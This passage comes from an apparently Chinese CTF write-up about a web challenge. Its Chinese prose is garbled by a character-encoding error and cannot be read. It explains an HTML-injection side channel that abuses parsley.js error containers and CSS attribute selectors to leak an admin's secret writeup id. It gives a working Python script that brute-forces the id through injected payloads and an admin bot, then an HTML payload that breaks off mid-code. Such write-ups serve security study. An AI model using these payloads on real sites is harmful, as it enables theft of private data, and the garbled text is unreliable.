¹æ®é¡µé¢é¡ºåºæ‹¿åˆ°ç¬¬ä¸€ä¸ªç‚¹èµ input ã€‚"></a>å›åˆ°é¢˜ç›®å½“ä¸­ï¼Œadmin æ‰€åšçš„åŠ¨ä½œæœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªå°±æ˜¯ç™»å½•ï¼Œæ ¹æ®é¢˜ç›®ä¿¡æ¯ï¼Œæˆ‘ä»¬åŸºæœ¬ä¸Šå¯¹è¿™ä¸ªæ“ä½œæ²¡åŠæ³•è¿›è¡Œä»€ä¹ˆå¹²æ‰°ï¼Œå¦å¤–ä¸€ä¸ªå°±æ˜¯ç‚¹èµäº†ï¼Œæ›´å…·ä½“æ¥è¯´å°±æ˜¯é€šè¿‡ show.php æ‰“å¼€ä½ çš„ writeup å†…å®¹ï¼Œå¹¶ä¸”ç‚¹å‡»é¡µé¢ä¸Š id ä¸º like çš„ input æ ‡ç­¾ï¼Œæ‰€ä»¥æˆ‘ä»¬æ›´å¯èƒ½çš„äº‹å¯¹ç‚¹èµæ“ä½œè¿›è¡Œä¸€ä¸ªå¹²æ‰°æˆ–è€…å…¶ä»–çš„æ“ä½œï¼Œå¹¶ä¸”æ ¹æ®å®é™…æµ‹è¯•ï¼Œé€šè¿‡<code>selenium.webdriver</code>è°ƒç”¨<code>find_element_by_xpath</code>å‡½æ•°å¾—åˆ°çš„ id ä¸º like çš„ input å…ƒç´ åªèƒ½æœ‰ç¬¬ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿æˆ‘ä»¬åœ¨ writeup å†…å®¹ä¸­æ’å…¥ä¸€ä¸ª id ä¸º like çš„ input æ ‡ç­¾ï¼Œadmin ä¹Ÿåªä¼šæ ¹æ®é¡µé¢é¡ºåºæ‹¿åˆ°ç¬¬ä¸€ä¸ªç‚¹èµ input ã€‚</h6><h6 id="å¹¶ä¸”-CSP-ä¹Ÿé™åˆ¶å¾—å¾ˆä¸¥æ ¼ï¼Œä¼¼ä¹é™·å…¥äº†åƒµå±€ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æœ‰ä»¥ä¸Š-parsley-js-çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬ä¼¼ä¹å¯ä»¥é€šè¿‡é”™è¯¯ä¿¡æ¯æ¥æ„é€ ä¸€äº›-Payload-ã€‚"><a href="#å¹¶ä¸”-CSP-ä¹Ÿé™åˆ¶å¾—å¾ˆä¸¥æ ¼ï¼Œä¼¼ä¹é™·å…¥äº†åƒµå±€ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æœ‰ä»¥ä¸Š-parsley-js-çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬ä¼¼ä¹å¯ä»¥é€šè¿‡é”™è¯¯ä¿¡æ¯æ¥æ„é€ ä¸€äº›-Payload-ã€‚" class="headerlink" title="å¹¶ä¸” CSP ä¹Ÿé™åˆ¶å¾—å¾ˆä¸¥æ ¼ï¼Œä¼¼ä¹é™·å…¥äº†åƒµå±€ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æœ‰ä»¥ä¸Š parsley.js çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬ä¼¼ä¹å¯ä»¥é€šè¿‡é”™è¯¯ä¿¡æ¯æ¥æ„é€ ä¸€äº› Payload ã€‚"></a>å¹¶ä¸” CSP ä¹Ÿé™åˆ¶å¾—å¾ˆä¸¥æ ¼ï¼Œä¼¼ä¹é™·å…¥äº†åƒµå±€ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æœ‰ä»¥ä¸Š parsley.js çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬ä¼¼ä¹å¯ä»¥é€šè¿‡é”™è¯¯ä¿¡æ¯æ¥æ„é€ ä¸€äº› Payload ã€‚</h6><h6 id="é¦–å…ˆï¼Œå› ä¸ºfind-element-by-xpathåªä¼šå¾—åˆ°ç¬¬ä¸€ä¸ª-id-ä¸º-like-çš„-input-æ ‡ç­¾ï¼Œè€Œæˆ‘ä»¬é€šè¿‡-parsley-js-å¯ä»¥å°†é”™è¯¯ä¿¡æ¯è¾“å‡ºåˆ°æŒ‡å®šé¡µé¢ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¤§æ¦‚å¯ä»¥æœ‰ä¸€ä¸ªæƒ³æ³•ï¼ŒæŠŠä¸€ä¸ªæ²¡æœ‰ç”¨çš„å•ç‹¬çš„-id-ä¸º-like-çš„-input-æ ‡ç­¾æ’å…¥åˆ°åŸæ¥çš„ç‚¹èµæŒ‰é’®ä¹‹å‰ã€‚"><a href="#é¦–å…ˆï¼Œå› ä¸ºfind-element-by-xpathåªä¼šå¾—åˆ°ç¬¬ä¸€ä¸ª-id-ä¸º-like-çš„-input-æ ‡ç­¾ï¼Œè€Œæˆ‘ä»¬é€šè¿‡-parsley-js-å¯ä»¥å°†é”™è¯¯ä¿¡æ¯è¾“å‡ºåˆ°æŒ‡å®šé¡µé¢ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¤§æ¦‚å¯ä»¥æœ‰ä¸€ä¸ªæƒ³æ³•ï¼ŒæŠŠä¸€ä¸ªæ²¡æœ‰ç”¨çš„å•ç‹¬çš„-id-ä¸º-like-çš„-input-æ ‡ç­¾æ’å…¥åˆ°åŸæ¥çš„ç‚¹èµæŒ‰é’®ä¹‹å‰ã€‚" class="headerlink" title="é¦–å…ˆï¼Œå› ä¸ºfind_element_by_xpathåªä¼šå¾—åˆ°ç¬¬ä¸€ä¸ª id ä¸º like çš„ input æ ‡ç­¾ï¼Œè€Œæˆ‘ä»¬é€šè¿‡ parsley.js å¯ä»¥å°†é”™è¯¯ä¿¡æ¯è¾“å‡ºåˆ°æŒ‡å®šé¡µé¢ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¤§æ¦‚å¯ä»¥æœ‰ä¸€ä¸ªæƒ³æ³•ï¼ŒæŠŠä¸€ä¸ªæ²¡æœ‰ç”¨çš„å•ç‹¬çš„ id ä¸º like çš„ input æ ‡ç­¾æ’å…¥åˆ°åŸæ¥çš„ç‚¹èµæŒ‰é’®ä¹‹å‰ã€‚"></a>é¦–å…ˆï¼Œå› ä¸º<code>find_element_by_xpath</code>åªä¼šå¾—åˆ°ç¬¬ä¸€ä¸ª id ä¸º like çš„ input æ ‡ç­¾ï¼Œè€Œæˆ‘ä»¬é€šè¿‡ parsley.js å¯ä»¥å°†é”™è¯¯ä¿¡æ¯è¾“å‡ºåˆ°æŒ‡å®šé¡µé¢ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¤§æ¦‚å¯ä»¥æœ‰ä¸€ä¸ªæƒ³æ³•ï¼ŒæŠŠä¸€ä¸ªæ²¡æœ‰ç”¨çš„å•ç‹¬çš„ id ä¸º like çš„ input æ ‡ç­¾æ’å…¥åˆ°åŸæ¥çš„ç‚¹èµæŒ‰é’®ä¹‹å‰ã€‚</h6><h6 id="ä½†æ˜¯è¿™æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿæˆ‘ä»¬å†æ¥ä»”ç»†çœ‹çœ‹-admin-è¦ç‚¹èµçš„é‚£ä¸ªé¡µé¢"><a href="#ä½†æ˜¯è¿™æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿæˆ‘ä»¬å†æ¥ä»”ç»†çœ‹çœ‹-admin-è¦ç‚¹èµçš„é‚£ä¸ªé¡µé¢" class="headerlink" title="ä½†æ˜¯è¿™æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿæˆ‘ä»¬å†æ¥ä»”ç»†çœ‹çœ‹ admin è¦ç‚¹èµçš„é‚£ä¸ªé¡µé¢"></a>ä½†æ˜¯è¿™æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿæˆ‘ä»¬å†æ¥ä»”ç»†çœ‹çœ‹ admin è¦ç‚¹èµçš„é‚£ä¸ªé¡µé¢</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-11.png" alt></p>
<h6 id="é¡µé¢ä¸Šéƒ¨åˆ†æ˜¯-header-php-ï¼Œä¼šå±•ç¤ºå½“å‰ç”¨æˆ·æ‰€æäº¤çš„-writeup-ï¼Œä¹Ÿå°±æ˜¯è¯´-admin-çš„è¿™ä¸ªé¡µé¢ï¼Œç¬¬ä¸€ä¸ªä¹Ÿæ˜¯å”¯ä¸€ä¸€ä¸ª-a-æ ‡ç­¾å°±æ˜¯-flag-çš„åœ°å€ï¼Œç°åœ¨çš„é—®é¢˜å°±å˜æˆäº†æˆ‘ä»¬æ€ä¹ˆè·å–è¿™ä¸ªåœ°å€çš„é—®é¢˜äº†ï¼Œæ›´è¯¦ç»†çš„æ¥è¯´ï¼Œæˆ‘ä»¬å¦‚ä½•è·å–è¿™ä¸ª-a-æ ‡ç­¾ä¸­çš„-href-å±æ€§å€¼ï¼Œæˆ–è€…æ›´ç¡®åˆ‡çš„è¯´å°±æ˜¯è·å–-writeup-id-çš„äº‹æƒ…äº†ã€‚"><a href="#é¡µé¢ä¸Šéƒ¨åˆ†æ˜¯-header-php-ï¼Œä¼šå±•ç¤ºå½“å‰ç”¨æˆ·æ‰€æäº¤çš„-writeup-ï¼Œä¹Ÿå°±æ˜¯è¯´-admin-çš„è¿™ä¸ªé¡µé¢ï¼Œç¬¬ä¸€ä¸ªä¹Ÿæ˜¯å”¯ä¸€ä¸€ä¸ª-a-æ ‡ç­¾å°±æ˜¯-flag-çš„åœ°å€ï¼Œç°åœ¨çš„é—®é¢˜å°±å˜æˆäº†æˆ‘ä»¬æ€ä¹ˆè·å–è¿™ä¸ªåœ°å€çš„é—®é¢˜äº†ï¼Œæ›´è¯¦ç»†çš„æ¥è¯´ï¼Œæˆ‘ä»¬å¦‚ä½•è·å–è¿™ä¸ª-a-æ ‡ç­¾ä¸­çš„-href-å±æ€§å€¼ï¼Œæˆ–è€…æ›´ç¡®åˆ‡çš„è¯´å°±æ˜¯è·å–-writeup-id-çš„äº‹æƒ…äº†ã€‚" class="headerlink" title="é¡µé¢ä¸Šéƒ¨åˆ†æ˜¯ header.php ï¼Œä¼šå±•ç¤ºå½“å‰ç”¨æˆ·æ‰€æäº¤çš„ writeup ï¼Œä¹Ÿå°±æ˜¯è¯´ admin çš„è¿™ä¸ªé¡µé¢ï¼Œç¬¬ä¸€ä¸ªä¹Ÿæ˜¯å”¯ä¸€ä¸€ä¸ª a æ ‡ç­¾å°±æ˜¯ flag çš„åœ°å€ï¼Œç°åœ¨çš„é—®é¢˜å°±å˜æˆäº†æˆ‘ä»¬æ€ä¹ˆè·å–è¿™ä¸ªåœ°å€çš„é—®é¢˜äº†ï¼Œæ›´è¯¦ç»†çš„æ¥è¯´ï¼Œæˆ‘ä»¬å¦‚ä½•è·å–è¿™ä¸ª a æ ‡ç­¾ä¸­çš„ href å±æ€§å€¼ï¼Œæˆ–è€…æ›´ç¡®åˆ‡çš„è¯´å°±æ˜¯è·å– writeup id çš„äº‹æƒ…äº†ã€‚"></a>é¡µé¢ä¸Šéƒ¨åˆ†æ˜¯ header.php ï¼Œä¼šå±•ç¤ºå½“å‰ç”¨æˆ·æ‰€æäº¤çš„ writeup ï¼Œä¹Ÿå°±æ˜¯è¯´ admin çš„è¿™ä¸ªé¡µé¢ï¼Œç¬¬ä¸€ä¸ªä¹Ÿæ˜¯å”¯ä¸€ä¸€ä¸ª a æ ‡ç­¾å°±æ˜¯ flag çš„åœ°å€ï¼Œç°åœ¨çš„é—®é¢˜å°±å˜æˆäº†æˆ‘ä»¬æ€ä¹ˆè·å–è¿™ä¸ªåœ°å€çš„é—®é¢˜äº†ï¼Œæ›´è¯¦ç»†çš„æ¥è¯´ï¼Œæˆ‘ä»¬å¦‚ä½•è·å–è¿™ä¸ª a æ ‡ç­¾ä¸­çš„ href å±æ€§å€¼ï¼Œæˆ–è€…æ›´ç¡®åˆ‡çš„è¯´å°±æ˜¯è·å– writeup id çš„äº‹æƒ…äº†ã€‚</h6><h6 id="CSS-Selector"><a href="#CSS-Selector" class="headerlink" title="CSS Selector"></a>CSS Selector</h6><h6 id="å¦‚ä½•è·å–-a-æ ‡ç­¾ä¸­çš„-href-å±æ€§å€¼è²Œä¼¼ä¹Ÿå°±è·Ÿæˆ‘ä»¬ä¹‹å‰æåˆ°çš„data-parsley-errors-container-APIæœ‰å…³äº†ï¼Œè€Œè¿™ä¸ª-API-åˆæ”¯æŒ-CSS-é€‰æ‹©å™¨ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥é€šè¿‡-CSS-é€‰æ‹©å™¨æ¥è®©æˆ‘ä»¬çš„æŠ¥é”™ä¿¡æ¯æ”¾åˆ°è¿™ä¸ª-a-æ ‡ç­¾ä¹‹åå‘¢ï¼Œè¿™æ ·ä»¥æ¥ä¹Ÿå°±ç›´æ¥å°±æ”¾åˆ°äº†ç‚¹èµæŒ‰é’®ä¹‹å‰äº†ã€‚"><a href="#å¦‚ä½•è·å–-a-æ ‡ç­¾ä¸­çš„-href-å±æ€§å€¼è²Œä¼¼ä¹Ÿå°±è·Ÿæˆ‘ä»¬ä¹‹å‰æåˆ°çš„data-parsley-errors-container-APIæœ‰å…³äº†ï¼Œè€Œè¿™ä¸ª-API-åˆæ”¯æŒ-CSS-é€‰æ‹©å™¨ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥é€šè¿‡-CSS-é€‰æ‹©å™¨æ¥è®©æˆ‘ä»¬çš„æŠ¥é”™ä¿¡æ¯æ”¾åˆ°è¿™ä¸ª-a-æ ‡ç­¾ä¹‹åå‘¢ï¼Œè¿™æ ·ä»¥æ¥ä¹Ÿå°±ç›´æ¥å°±æ”¾åˆ°äº†ç‚¹èµæŒ‰é’®ä¹‹å‰äº†ã€‚" class="headerlink" title="å¦‚ä½•è·å– a æ ‡ç­¾ä¸­çš„ href å±æ€§å€¼è²Œä¼¼ä¹Ÿå°±è·Ÿæˆ‘ä»¬ä¹‹å‰æåˆ°çš„data-parsley-errors-container APIæœ‰å…³äº†ï¼Œè€Œè¿™ä¸ª API åˆæ”¯æŒ CSS é€‰æ‹©å™¨ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥é€šè¿‡ CSS é€‰æ‹©å™¨æ¥è®©æˆ‘ä»¬çš„æŠ¥é”™ä¿¡æ¯æ”¾åˆ°è¿™ä¸ª a æ ‡ç­¾ä¹‹åå‘¢ï¼Œè¿™æ ·ä»¥æ¥ä¹Ÿå°±ç›´æ¥å°±æ”¾åˆ°äº†ç‚¹èµæŒ‰é’®ä¹‹å‰äº†ã€‚"></a>å¦‚ä½•è·å– a æ ‡ç­¾ä¸­çš„ href å±æ€§å€¼è²Œä¼¼ä¹Ÿå°±è·Ÿæˆ‘ä»¬ä¹‹å‰æåˆ°çš„<code>data-parsley-errors-container</code> APIæœ‰å…³äº†ï¼Œè€Œè¿™ä¸ª API åˆæ”¯æŒ CSS é€‰æ‹©å™¨ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥é€šè¿‡ CSS é€‰æ‹©å™¨æ¥è®©æˆ‘ä»¬çš„æŠ¥é”™ä¿¡æ¯æ”¾åˆ°è¿™ä¸ª a æ ‡ç­¾ä¹‹åå‘¢ï¼Œè¿™æ ·ä»¥æ¥ä¹Ÿå°±ç›´æ¥å°±æ”¾åˆ°äº†ç‚¹èµæŒ‰é’®ä¹‹å‰äº†ã€‚</h6><h6 id="ç±»ä¼¼ä¹‹å‰-XCTF-Final-ä¸€ä¸ª-CSS-ä¾§ä¿¡é“çš„é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ©ç”¨a-href-39-show-php-id-flag-çš„å½¢å¼æ¥è¿›è¡Œå…ƒç´ é€‰æ‹©ã€‚"><a href="#ç±»ä¼¼ä¹‹å‰-XCTF-Final-ä¸€ä¸ª-CSS-ä¾§ä¿¡é“çš„é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ©ç”¨a-href-39-show-php-id-flag-çš„å½¢å¼æ¥è¿›è¡Œå…ƒç´ é€‰æ‹©ã€‚" class="headerlink" title="ç±»ä¼¼ä¹‹å‰ XCTF Final ä¸€ä¸ª CSS ä¾§ä¿¡é“çš„é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ©ç”¨a[href^=&#39;/show.php?id={flag}]çš„å½¢å¼æ¥è¿›è¡Œå…ƒç´ é€‰æ‹©ã€‚"></a>ç±»ä¼¼ä¹‹å‰ XCTF Final ä¸€ä¸ª CSS ä¾§ä¿¡é“çš„é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ©ç”¨<code>a[href^=&#39;/show.php?id={flag}]</code>çš„å½¢å¼æ¥è¿›è¡Œå…ƒç´ é€‰æ‹©ã€‚</h6><h6 id="ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬ä¼ å…¥çš„-flag-å€¼ä¸é¡µé¢ä¸­çš„-href-å±æ€§å€¼ä¹Ÿå°±æ˜¯-writeup-id-å‰éƒ¨åˆ†å®Œå…¨åŒ¹é…çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸€ä¸ªæ— æ•ˆçš„-id-like-input-æ ‡ç­¾æ’å…¥åˆ°è¯¥-a-æ ‡ç­¾ä¹‹åï¼Œäº¦å³çœŸæ­£ç”¨äºæäº¤-like-è¯·æ±‚çš„-input-æ ‡ç­¾ä¹‹å‰ï¼›å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„-flag-å€¼ä¸é¡µé¢ä¸­çš„-href-å±æ€§å€¼ä¹Ÿå°±æ˜¯-writeup-id-å‰éƒ¨åˆ†ä¸å®Œå…¨åŒ¹é…çš„ï¼Œparsley-js-ä»€ä¹ˆä¹Ÿä¸ä¼šåšï¼Œadmin-ä¼šæ­£å¸¸åœ°ç‚¹èµï¼Œæˆ‘ä»¬å¯ä»¥æ­£å¸¸åœ°åœ¨è‡ªå·±çš„-writeup-é¡µé¢çœ‹åˆ°-admin-çš„ç‚¹èµã€‚"><a href="#ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬ä¼ å…¥çš„-flag-å€¼ä¸é¡µé¢ä¸­çš„-href-å±æ€§å€¼ä¹Ÿå°±æ˜¯-writeup-id-å‰éƒ¨åˆ†å®Œå…¨åŒ¹é…çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸€ä¸ªæ— æ•ˆçš„-id-like-input-æ ‡ç­¾æ’å…¥åˆ°è¯¥-a-æ ‡ç­¾ä¹‹åï¼Œäº¦å³çœŸæ­£ç”¨äºæäº¤-like-è¯·æ±‚çš„-input-æ ‡ç­¾ä¹‹å‰ï¼›å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„-flag-å€¼ä¸é¡µé¢ä¸­çš„-href-å±æ€§å€¼ä¹Ÿå°±æ˜¯-writeup-id-å‰éƒ¨åˆ†ä¸å®Œå…¨åŒ¹é…çš„ï¼Œparsley-js-ä»€ä¹ˆä¹Ÿä¸ä¼šåšï¼Œadmin-ä¼šæ­£å¸¸åœ°ç‚¹èµï¼Œæˆ‘ä»¬å¯ä»¥æ­£å¸¸åœ°åœ¨è‡ªå·±çš„-writeup-é¡µé¢çœ‹åˆ°-admin-çš„ç‚¹èµã€‚" class="headerlink" title="ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬ä¼ å…¥çš„ flag å€¼ä¸é¡µé¢ä¸­çš„ href å±æ€§å€¼ä¹Ÿå°±æ˜¯ writeup id å‰éƒ¨åˆ†å®Œå…¨åŒ¹é…çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸€ä¸ªæ— æ•ˆçš„ id=like input æ ‡ç­¾æ’å…¥åˆ°è¯¥ a æ ‡ç­¾ä¹‹åï¼Œäº¦å³çœŸæ­£ç”¨äºæäº¤ like è¯·æ±‚çš„ input æ ‡ç­¾ä¹‹å‰ï¼›å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„ flag å€¼ä¸é¡µé¢ä¸­çš„ href å±æ€§å€¼ä¹Ÿå°±æ˜¯ writeup id å‰éƒ¨åˆ†ä¸å®Œå…¨åŒ¹é…çš„ï¼Œparsley.js ä»€ä¹ˆä¹Ÿä¸ä¼šåšï¼Œadmin ä¼šæ­£å¸¸åœ°ç‚¹èµï¼Œæˆ‘ä»¬å¯ä»¥æ­£å¸¸åœ°åœ¨è‡ªå·±çš„ writeup é¡µé¢çœ‹åˆ° admin çš„ç‚¹èµã€‚"></a>ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬ä¼ å…¥çš„ flag å€¼ä¸é¡µé¢ä¸­çš„ href å±æ€§å€¼ä¹Ÿå°±æ˜¯ writeup id å‰éƒ¨åˆ†å®Œå…¨åŒ¹é…çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸€ä¸ªæ— æ•ˆçš„ id=like input æ ‡ç­¾æ’å…¥åˆ°è¯¥ a æ ‡ç­¾ä¹‹åï¼Œäº¦å³çœŸæ­£ç”¨äºæäº¤ like è¯·æ±‚çš„ input æ ‡ç­¾ä¹‹å‰ï¼›å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„ flag å€¼ä¸é¡µé¢ä¸­çš„ href å±æ€§å€¼ä¹Ÿå°±æ˜¯ writeup id å‰éƒ¨åˆ†ä¸å®Œå…¨åŒ¹é…çš„ï¼Œparsley.js ä»€ä¹ˆä¹Ÿä¸ä¼šåšï¼Œadmin ä¼šæ­£å¸¸åœ°ç‚¹èµï¼Œæˆ‘ä»¬å¯ä»¥æ­£å¸¸åœ°åœ¨è‡ªå·±çš„ writeup é¡µé¢çœ‹åˆ° admin çš„ç‚¹èµã€‚</h6><h6 id="æ‰€ä»¥åŸºäºè¿™ä¸ªå·®å¼‚ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç§å½¢å¼æ¥è¿›è¡Œä¸€ä¸ªä¾§ä¿¡é“æ”»å‡»è·å–-flag-çš„-writeup-idã€‚"><a href="#æ‰€ä»¥åŸºäºè¿™ä¸ªå·®å¼‚ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç§å½¢å¼æ¥è¿›è¡Œä¸€ä¸ªä¾§ä¿¡é“æ”»å‡»è·å–-flag-çš„-writeup-idã€‚" class="headerlink" title="æ‰€ä»¥åŸºäºè¿™ä¸ªå·®å¼‚ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç§å½¢å¼æ¥è¿›è¡Œä¸€ä¸ªä¾§ä¿¡é“æ”»å‡»è·å– flag çš„ writeup idã€‚"></a>æ‰€ä»¥åŸºäºè¿™ä¸ªå·®å¼‚ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç§å½¢å¼æ¥è¿›è¡Œä¸€ä¸ªä¾§ä¿¡é“æ”»å‡»è·å– flag çš„ writeup idã€‚</h6><h6 id="è„šæœ¬ç¼–å†™ä¹Ÿæ¯”è¾ƒç®€å•ï¼š"><a href="#è„šæœ¬ç¼–å†™ä¹Ÿæ¯”è¾ƒç®€å•ï¼š" class="headerlink" title="è„šæœ¬ç¼–å†™ä¹Ÿæ¯”è¾ƒç®€å•ï¼š"></a>è„šæœ¬ç¼–å†™ä¹Ÿæ¯”è¾ƒç®€å•ï¼š</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">"http://ip:8001/"</span></span><br><span class="line"></span><br><span class="line">res = s.get(base_url)</span><br><span class="line"></span><br><span class="line">pos = res.text.find(<span class="string">'name="c" value="'</span>) + len(<span class="string">'name="c" value="'</span>)</span><br><span class="line">csrftoken = res.text[pos:pos+<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">ss = <span class="string">"1234567890abcdef"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> ss:</span><br><span class="line">        payload = <span class="string">f"&lt;form data-parsley-validate&gt;&lt;input data-parsley-required data-parsley-trigger=\"blur\" data-parsley-error-message='&lt;input type=\"input\" id=like value=\"rebirth_is_really_nb\"&gt;' data-parsley-errors-container=\"a[href^='/show.php?id=<span class="subst">&#123;flag + j&#125;</span>']\" autofocus&gt;&lt;/form&gt;"</span></span><br><span class="line">        data = &#123;<span class="string">'c'</span>: csrftoken, <span class="string">'content'</span>: payload&#125;</span><br><span class="line">        res = s.post(base_url + <span class="string">"add.php"</span>, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="comment"># print(res.headers)</span></span><br><span class="line">        location = res.headers[<span class="string">'Location'</span>]</span><br><span class="line">        pos = location.find(<span class="string">'id='</span>) + <span class="number">3</span></span><br><span class="line">        wp = location[pos:]</span><br><span class="line">        data = &#123;<span class="string">'c'</span>: csrftoken, <span class="string">'id'</span>: wp&#125;</span><br><span class="line">        res = s.post(base_url + <span class="string">"admin.php"</span>, data=data)</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        res = s.get(<span class="string">f"http://ip:8001/show.php?id=<span class="subst">&#123;wp&#125;</span>"</span>)</span><br><span class="line">        <span class="comment"># print(res.text)</span></span><br><span class="line">        txt = res.text.replace(<span class="string">"\n"</span>, <span class="string">""</span>).replace(<span class="string">"\r"</span>, <span class="string">""</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Liked by&lt;/h3&gt;admin"</span> <span class="keyword">not</span> <span class="keyword">in</span> txt:</span><br><span class="line">            flag += j</span><br><span class="line">            print(i,flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h6 id="æ‹¿åˆ°-writeup-id-ä¹‹åç›´æ¥è®¿é—®å³å¯ï¼š"><a href="#æ‹¿åˆ°-writeup-id-ä¹‹åç›´æ¥è®¿é—®å³å¯ï¼š" class="headerlink" title="æ‹¿åˆ° writeup id ä¹‹åç›´æ¥è®¿é—®å³å¯ï¼š"></a>æ‹¿åˆ° writeup id ä¹‹åç›´æ¥è®¿é—®å³å¯ï¼š</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-12.png" alt></p>
<h6 id="Other-Selector"><a href="#Other-Selector" class="headerlink" title="Other Selector"></a>Other Selector</h6><h6 id="å½“ç„¶è¯¥é¡µé¢ä¸ä»…å¯ä»¥ä½¿ç”¨-a-æ ‡ç­¾çš„-href-å±æ€§è¿›è¡Œè·å–-writeup-idï¼Œä¹Ÿå¯ä»¥è·å–å®ƒ-value-å€¼ï¼Œä¾‹å¦‚ï¼š"><a href="#å½“ç„¶è¯¥é¡µé¢ä¸ä»…å¯ä»¥ä½¿ç”¨-a-æ ‡ç­¾çš„-href-å±æ€§è¿›è¡Œè·å–-writeup-idï¼Œä¹Ÿå¯ä»¥è·å–å®ƒ-value-å€¼ï¼Œä¾‹å¦‚ï¼š" class="headerlink" title="å½“ç„¶è¯¥é¡µé¢ä¸ä»…å¯ä»¥ä½¿ç”¨ a æ ‡ç­¾çš„ href å±æ€§è¿›è¡Œè·å– writeup idï¼Œä¹Ÿå¯ä»¥è·å–å®ƒ value å€¼ï¼Œä¾‹å¦‚ï¼š"></a>å½“ç„¶è¯¥é¡µé¢ä¸ä»…å¯ä»¥ä½¿ç”¨ a æ ‡ç­¾çš„ href å±æ€§è¿›è¡Œè·å– writeup idï¼Œä¹Ÿå¯ä»¥è·å–å®ƒ value å€¼ï¼Œä¾‹å¦‚ï¼š</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">data-parsley-validate</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">id</span>=<span class="string">"like"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">data-parsley-trigger</span>=<span class="string">"blur"</span> <span class="attr">autofocus</span></span></span><br><span class="line"><span class="tag">         